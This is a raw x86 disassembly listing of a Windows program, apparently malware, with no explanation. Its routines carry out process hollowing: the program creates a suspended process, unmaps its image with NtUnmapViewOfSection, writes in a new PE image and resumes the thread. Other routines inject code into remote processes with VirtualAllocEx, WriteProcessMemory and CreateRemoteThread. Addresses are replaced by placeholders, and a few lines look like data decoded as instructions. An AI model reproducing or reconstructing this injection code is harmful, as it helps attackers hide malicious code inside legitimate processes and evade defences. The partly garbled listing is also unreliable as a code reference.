call sub_4059cc
xor eax eax
push ebp
push sub_473daa
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
call CreateFileA
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473db1
lea eax [ ebp - 0x4 ]
call sub_405530
retn
push 0x0
push edi
call GetFileSize
mov esi eax
push esi
mov eax [ ebp - 0x8 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406928
add esp 0x4
push 0x0
lea eax [ ebp - 0xc ]
push eax
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
push edi
call ReadFile
push edi
call CloseHandle
cmp esi [ ebp - 0xc ]
jne r-xdata
mov bl 0x1
sub_473dbc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
cmp [ eax + 0xa4 ] 0x0
jbe r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ eax + 0xa0 ]
add eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x0
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
add eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov ebx [ ebp - 0xc ]
add ebx 0x8
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
sub eax 0x8
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
fild [ ebp - 0x20 ]
fdiv [ r-xdata ]
call sub_40345c
mov esi eax
dec esi
test esi esi
jb r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
add eax [ ebp - 0xc ]
mov [ ebp - 0xc ] eax
inc esi
add ebx 0x2
dec esi
jne r-xdata
mov eax [ ebp - 0x10 ]
add eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov edx [ ebp + 0x10 ]
add [ eax ] edx
movzx edi [ ebx ]
shr edi 0xc
movzx eax [ ebx ]
and ax 0xfff
movzx eax ax
mov [ ebp - 0x18 ] eax
cmp edi 0x3
jne r-xdata
sub_473e74
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
mov [ esp + 0x4 ] ebx
mov eax [ esp + 0x4 ]
mov esi [ eax + 0x3c ]
add esi ebx
mov eax [ esi + 0x50 ]
call sub_402f00
mov [ esp ] eax
mov edx [ esi + 0x50 ]
mov eax [ esp ]
xor ecx ecx
call sub_403af4
mov ecx [ esi + 0x54 ]
mov edx ebx
mov eax [ esp ]
call sub_408560
movzx eax [ esi + 0x6 ]
dec eax
test ax ax
jb r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
inc eax
mov si ax
xor edi edi
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x3c ]
mov edx ebx
add eax edx
add eax 0xf8
movzx ecx di
add ecx ecx
add ecx ecx
add ecx ecx
lea ecx [ ecx + ecx * 4 ]
add eax ecx
mov ecx [ esp ]
add ecx [ eax + 0xc ]
add edx [ eax + 0x14 ]
mov eax [ eax + 0x10 ]
xchg ecx eax
call sub_408560
inc edi
dec si
jne r-xdata
sub_473f00
push ebx
mov ebx eax
push 0x4
push 0x1000
push 0xd0
push 0x0
call VirtualAlloc
mov [ ebx ] eax
mov eax [ ebx ]
cmp [ ebx ] 0x0
je r-xdata
pop ebx
retn
jmp r-xdata
mov edx eax
mov ecx edx
and ecx 0x3
test ecx ecx
jne r-xdata
inc edx
mov eax edx
sub_473f34
push ebp
mov ebp esp
add esp 0xffffff8c
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_47419c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov ebx esi
cmp [ ebx ] 0x5a4d
jne r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x8 ]
mov edx 0x4
call sub_4058e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4741a3
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
mov edi esi
add edi [ ebx + 0x3c ]
cmp [ edi ] 0x4550
jne r-xdata
lea eax [ ebp - 0x74 ]
xor ecx ecx
mov edx 0x44
call sub_403af4
lea eax [ ebp - 0x30 ]
xor ecx ecx
mov edx 0x10
call sub_403af4
mov [ ebp - 0x74 ] 0x44
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x74 ]
push eax
push 0x0
push 0x0
push 0x4
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
call CreateProcessA
test eax eax
je r-xdata
lea eax [ ebp - 0x14 ]
call sub_473f00
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
mov [ eax ] 0x10007
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
call GetThreadContext
test eax eax
je r-xdata
push 0x0
mov eax [ ebp - 0x30 ]
push eax
call TerminateProcess
push 0x8000
push 0x0
mov eax [ ebp - 0x14 ]
push eax
call VirtualFree
lea eax [ ebp - 0x20 ]
push eax
push 0x4
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa4 ]
add eax 0x8
push eax
mov eax [ ebp - 0x30 ]
push eax
call ReadProcessMemory
mov eax [ edi + 0x34 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push 0x40
push 0x3000
mov eax [ edi + 0x50 ]
push eax
mov eax [ edi + 0x34 ]
push eax
mov eax [ ebp - 0x30 ]
push eax
call VirtualAllocEx
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x34 ]
push eax
mov eax [ ebp - 0x30 ]
push eax
call NtUnmapViewOfSection
test eax eax
jne r-xdata
mov eax esi
call sub_473e74
mov esi eax
mov edx [ edi + 0x34 ]
mov eax [ ebp - 0x1c ]
cmp edx eax
je r-xdata
push 0x40
push 0x3000
mov eax [ edi + 0x50 ]
push eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
call VirtualAllocEx
mov [ ebp - 0x1c ] eax
jmp r-xdata
push 0x40
push 0x3000
mov eax [ edi + 0x50 ]
push eax
mov eax [ edi + 0x34 ]
push eax
mov eax [ ebp - 0x30 ]
push eax
call VirtualAllocEx
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
mov eax [ edi + 0x50 ]
push eax
push esi
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
call WriteProcessMemory
lea eax [ ebp - 0x20 ]
push eax
push 0x4
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa4 ]
add eax 0x8
push eax
mov eax [ ebp - 0x30 ]
push eax
call WriteProcessMemory
mov eax [ edi + 0x28 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
mov [ edx + 0xb0 ] eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
call SetThreadContext
mov eax [ ebp - 0x2c ]
push eax
call ResumeThread
mov eax [ ebp - 0x2c ]
mov [ ebp - 0xc ] eax
sub eax [ edi + 0x34 ]
push eax
push edi
push esi
call sub_473dbc
mov eax [ ebp - 0x1c ]
mov [ edi + 0x34 ] eax
mov eax esi
add eax [ ebx + 0x3c ]
mov ecx 0xf8
mov edx edi
call sub_408560
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_4741bf
inc [ edx ]
add [ eax ] al
add [ edx ] ah
and [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4741ff
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474206
retn
mov eax rw-data
mov edx [ r-xdata ]
call sub_406934
sub_474208
push ebx
push esi
mov esi rw-data
xor ebx ebx
push r-xdata
call LoadLibraryA
mov [ esi ] eax
cmp [ esi ] 0x0
jbe r-xdata
mov eax ebx
pop esi
pop ebx
retn
push r-xdata
mov eax [ esi ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ esi ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ esi ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ esi ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ esi ]
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov bl 0x1
sub_47433c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_405530
cmp esi 0x3
jg r-xdata
sub esi 0x4
je r-xdata
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
pop esi
pop ebx
retn
dec esi
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
pop esi
pop ebx
retn
sub esi 0x80000000
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
pop esi
pop ebx
retn
dec esi
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
pop esi
pop ebx
retn
sub esi 0x7fffffff
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
pop esi
pop ebx
retn
dec esi
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
sub esi 0x2
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
pop esi
pop ebx
retn
jmp r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
pop esi
pop ebx
retn
dec esi
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_405584
pop esi
pop ebx
retn
jmp r-xdata
sub_4744b8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_405530
cmp esi 0x2
jg r-xdata
sub esi 0x4
je r-xdata
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
pop esi
pop ebx
retn
dec esi
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
pop esi
pop ebx
retn
sub esi 0x80000000
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
pop esi
pop ebx
retn
sub esi 0xfb
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
pop esi
pop ebx
retn
sub esi 0x7fffffff
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
pop esi
pop ebx
retn
dec esi
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
dec esi
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
pop esi
pop ebx
retn
jmp r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
pop esi
pop ebx
retn
dec esi
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_405584
pop esi
pop ebx
retn
jmp r-xdata
sub_474638
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x30 ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_474a0a
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_474208
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474a11
lea eax [ ebp - 0x40 ]
call sub_405530
lea eax [ ebp - 0x34 ]
mov edx 0x2
call sub_405554
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_405554
retn
xor edx edx
push ebp
push sub_4749d3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x14 ]
call sub_405530
lea eax [ ebp - 0xc ]
call sub_405530
lea eax [ ebp - 0x10 ]
call sub_405530
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
call sub_404f70
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
dec eax
test eax eax
jl r-xdata
call sub_404f70
jmp r-xdata
push [ ebp - 0xc ]
push r-xdata
push r-xdata
push [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov edx 0x4
call sub_4058e0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
call sub_474324
retn
inc eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x24 ] 0x0
mov eax [ ebp - 0x28 ]
mov edi [ eax ]
dec edi
test edi edi
jl r-xdata
call sub_404f70
jmp r-xdata
inc [ ebp - 0x24 ]
dec [ ebp - 0x2c ]
jne r-xdata
inc edi
xor ebx ebx
push [ ebp - 0x10 ]
lea eax [ ebp - 0x30 ]
imul ebx [ ebp - 0x24 ] 0x85
mov edx [ ebp - 0x20 ]
lea edx [ edx + ebx * 4 + 0x18 ]
mov ecx 0x100
call sub_4057b8
push [ ebp - 0x30 ]
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4058e0
push [ ebp - 0x10 ]
mov eax [ ebp - 0x20 ]
lea eax [ eax + ebx * 4 + 0x8 ]
lea edx [ ebp - 0x34 ]
call sub_4097a0
push [ ebp - 0x34 ]
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0x20 ]
imul eax [ eax + 0x4 ] 0x85
mov edx [ ebp - 0x20 ]
lea eax [ edx + eax * 4 + 0x8 ]
lea edx [ ebp - 0x28 ]
push edx
push 0x0
push 0x1
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
test eax eax
jg r-xdata
sub eax 0x4
mov eax [ eax ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4058e0
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x28 ]
lea edx [ edx + esi * 4 + 0x20c ]
call sub_405728
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] 0xb
lea edx [ ebp - 0x3c ]
xor ecx ecx
mov eax r-xdata
call sub_40af98
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4055c8
test eax eax
jg r-xdata
sub eax 0x4
mov eax [ eax ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4058e0
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x28 ]
mov eax [ eax + esi * 4 + 0x264 ]
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] 0x0
lea edx [ ebp - 0x3c ]
xor ecx ecx
mov eax r-xdata
call sub_40af98
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4055c8
test eax eax
jg r-xdata
sub eax 0x4
mov eax [ eax ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push r-xdata
push r-xdata
lea eax [ ebp - 0xc ]
mov edx 0x4
call sub_4058e0
mov eax [ ebp - 0x28 ]
mov eax [ eax + esi * 4 + 0x26c ]
lea edx [ ebp - 0x4 ]
call sub_47433c
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] 0xb
lea edx [ ebp - 0x3c ]
xor ecx ecx
mov eax r-xdata
call sub_40af98
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4055c8
test eax eax
jg r-xdata
sub eax 0x4
mov eax [ eax ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0x28 ]
mov eax [ eax + esi * 4 + 0x270 ]
lea edx [ ebp - 0x4 ]
call sub_4744b8
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] 0xb
lea edx [ ebp - 0x3c ]
xor ecx ecx
mov eax r-xdata
call sub_40af98
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_405530
test eax eax
jg r-xdata
sub eax 0x4
mov eax [ eax ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4058e0
inc ebx
dec edi
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_405530
lea eax [ ebp - 0x8 ]
push eax
imul esi ebx 0x9d
mov eax [ ebp - 0x28 ]
lea eax [ eax + esi * 4 + 0x8 ]
lea edx [ ebp - 0x40 ]
call sub_40642c
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] 0xb
lea edx [ ebp - 0x3c ]
xor ecx ecx
mov eax r-xdata
call sub_40af98
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
sub_474a6c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
push ebp
push sub_474d1e
push [ fs : 0x0 ]
mov [ fs : 0x0 ] esp
mov edi eax
test eax eax
je r-xdata
mov ebx eax
sub ebx edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x1 ] 0x0
xor edx edx
mov [ ebp - 0x8 ] 0x4
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp si 0x67
jne r-xdata
mov [ ebp - 0x8 ] 0x2
jmp r-xdata
mov ecx esi
and cx 0xe7
cmp cx 0x26
je r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
test dl dl
je r-xdata
mov ecx esi
add ecx 0xffffff9c
sub cx 0x2
jb r-xdata
movzx esi [ eax ]
inc eax
cmp si 0x66
jne r-xdata
cmp si 0xf
jne r-xdata
mov dl 0x1
movzx edx si
movzx ecx [ edx * 2 + rw-data ]
movzx esi [ eax ]
movzx edx si
movzx ecx [ edx * 2 + rw-data ]
add si 0xf00
inc eax
jmp r-xdata
and ecx 0xc00
sub ecx 0x400
je r-xdata
movzx edx [ eax ]
mov ebx edx
and bl 0x7
movzx ebx bl
mov [ ebp - 0xc ] ebx
inc eax
mov ebx edx
and bl 0xc0
sub bl 0x40
je r-xdata
test cl 0x38
je r-xdata
inc eax
jmp r-xdata
sub ecx 0x400
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub bl 0x40
je r-xdata
add eax 0x2
jmp r-xdata
sub ecx 0x400
je r-xdata
mov ebx edx
and bl 0xc0
cmp bl 0xc0
setne bl
and bl [ ebp - 0x1 ]
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
jmp r-xdata
add eax [ ebp - 0x8 ]
jmp r-xdata
jmp r-xdata
mov ebx ecx
and ebx 0x38
cmp ebx 0x8
jne r-xdata
cmp [ ebp - 0xc ] 0x4
jne r-xdata
mov [ ebp - 0x10 ] 0x4
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
xor ebx ebx
mov [ ebp - 0x10 ] ebx
sub si 0x9a
je r-xdata
movzx ecx si
add ecx 0xffffff28
cmp ecx 0x1f
ja r-xdata
test dl 0xc0
jne r-xdata
mov ebx edx
and bl 0xc0
cmp bl 0xc0
je r-xdata
add eax [ ebp - 0x8 ]
add eax 0x2
jmp r-xdata
add esi 0xfffffffa
sub si 0x4
jb r-xdata
mov ecx edx
and cl 0xc0
cmp cl 0xc0
je r-xdata
movzx ecx [ ecx + lookup_table_474bc7 ]
jmp [ ecx * 4 + jump_table_474be7 ]
add eax [ ebp - 0x10 ]
cmp [ ebp - 0xc ] 0x5
jne r-xdata
movzx ebx [ eax ]
and bl 0x7
movzx ebx bl
mov [ ebp - 0xc ] ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub si 0x24
je r-xdata
movzx edx dl
shr edx 0x3
and edx 0x7
mov ecx [ ebp - 0x14 ]
add ecx ecx
add ecx ecx
lea ecx [ ecx * 8 + rw-data ]
movzx ecx [ ecx + edx * 2 + 0x10 ]
movzx edx dl
shr edx 0x3
and edx 0x7
mov ecx [ ebp - 0x14 ]
add ecx ecx
add ecx ecx
lea ecx [ ecx * 8 + rw-data ]
movzx ecx [ ecx + edx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
mov [ ebp - 0x14 ] 0x5
jmp r-xdata
mov [ ebp - 0x14 ] 0x6
jmp r-xdata
mov [ ebp - 0x14 ] 0x7
jmp r-xdata
mov [ ebp - 0x14 ] 0x8
jmp r-xdata
mov [ ebp - 0x14 ] 0x9
mov [ ebp - 0x10 ] 0x4
add eax 0x4
add eax 0x2
jmp r-xdata
add eax 0x3
jmp r-xdata
sub si 0x22
jne r-xdata
sub_474d34
push ebx
push esi
mov ebx eax
xor esi esi
add ebx eax
test eax eax
jne r-xdata
cmp [ ebx ] 0xc3
je r-xdata
mov eax ebx
call sub_474a6c
add esi eax
cmp eax 0x1
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
sub_474d58
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_474dde
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_405728
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
push 0x40
push 0x3000
inc eax
push eax
push 0x0
push esi
call VirtualAllocEx
mov edi eax
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_405728
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
sub eax 0x4
mov eax [ eax ]
lea edx [ ebp - 0x4 ]
push edx
inc eax
push eax
push ebx
push edi
push esi
call WriteProcessMemory
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474de5
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_405554
retn
sub eax 0x4
mov eax [ eax ]
sub_474df0
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov ebp edx
mov ebx eax
push 0x40
push 0x3000
push esi
push 0x0
push ebx
call VirtualAllocEx
mov edi eax
push esp
push esi
push ebp
push edi
push ebx
call WriteProcessMemory
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_474e20
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_474df0
mov esi eax
mov eax edi
call sub_474d34
mov ecx eax
mov edx edi
mov eax ebx
call sub_474df0
lea edx [ ebp - 0xc ]
push edx
push 0x0
push esi
push eax
push 0x0
push 0x0
push ebx
call CreateRemoteThread
mov edi eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push 0xffffffff
push edi
call WaitForSingleObject
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
push ebx
call ReadProcessMemory
sub_474e94
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
call [ ebx ]
push eax
call [ ebx + 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebx + 0x38 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call [ ebx ]
push eax
call [ ebx + 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x3c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
call [ ebx ]
push eax
call [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
mov eax [ ebx + 0x40 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
call [ ebx ]
push eax
call [ ebx + 0x4 ]
mov [ ebx + 0x14 ] eax
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
call [ ebx ]
push eax
call [ ebx + 0x4 ]
mov [ ebx + 0x18 ] eax
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
call [ ebx ]
push eax
call [ ebx + 0x4 ]
mov [ ebx + 0x1c ] eax
mov eax [ ebx + 0x54 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
call [ ebx ]
push eax
call [ ebx + 0x4 ]
mov [ ebx + 0x20 ] eax
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
call [ ebx ]
push eax
call [ ebx + 0x4 ]
mov [ ebx + 0x24 ] eax
mov eax [ ebx + 0x50 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
call [ ebx ]
push eax
call [ ebx + 0x4 ]
mov [ ebx + 0x28 ] eax
jmp r-xdata
mov eax [ ebx + 0x5c ]
push eax
call [ ebx + 0x14 ]
test al al
je r-xdata
call [ ebx + 0x18 ]
cmp eax 0x2
je r-xdata
mov eax [ ebx + 0x58 ]
push eax
push 0x0
push 0x1
call [ ebx + 0x24 ]
mov esi eax
test esi esi
je r-xdata
push 0x1f4
call [ ebx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push edi
push esi
call [ ebx + 0x28 ]
push edi
push esi
call [ ebx + 0x1c ]
push esi
call [ ebx + 0x20 ]
push 0x0
call [ ebx + 0x10 ]
sub_474f80
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
lea esi [ ebp - 0x6c ]
xor eax eax
push ebp
push sub_475246
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xb0 ]
xor ecx ecx
mov edx 0x44
call sub_403af4
mov [ ebp - 0xb0 ] 0x44
mov [ ebp - 0x84 ] 0x1
mov [ ebp - 0x80 ] 0x0
lea eax [ ebp - 0xc0 ]
push eax
lea eax [ ebp - 0xb0 ]
push eax
push 0x0
push 0x0
push 0x8000000
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
push 0x0
call CreateProcessA
mov ebx [ ebp - 0xc0 ]
mov eax [ ebp - 0x4 ]
call sub_40a26c
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_40a26c
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov edx r-xdata
mov eax ebx
call sub_474d58
mov [ esi + 0x2c ] eax
mov edx r-xdata
mov eax ebx
call sub_474d58
mov [ esi + 0x30 ] eax
mov edx r-xdata
mov eax ebx
call sub_474d58
mov [ esi + 0x34 ] eax
mov edx r-xdata
mov eax ebx
call sub_474d58
mov [ esi + 0x38 ] eax
mov edx r-xdata
mov eax ebx
call sub_474d58
mov [ esi + 0x3c ] eax
mov edx r-xdata
mov eax ebx
call sub_474d58
mov [ esi + 0x40 ] eax
mov edx r-xdata
mov eax ebx
call sub_474d58
mov [ esi + 0x44 ] eax
mov edx r-xdata
mov eax ebx
call sub_474d58
mov [ esi + 0x48 ] eax
mov edx r-xdata
mov eax ebx
call sub_474d58
mov [ esi + 0x54 ] eax
mov edx r-xdata
mov eax ebx
call sub_474d58
mov [ esi + 0x4c ] eax
mov edx r-xdata
mov eax ebx
call sub_474d58
mov [ esi + 0x50 ] eax
mov eax [ ebp - 0xc ]
call sub_4059dc
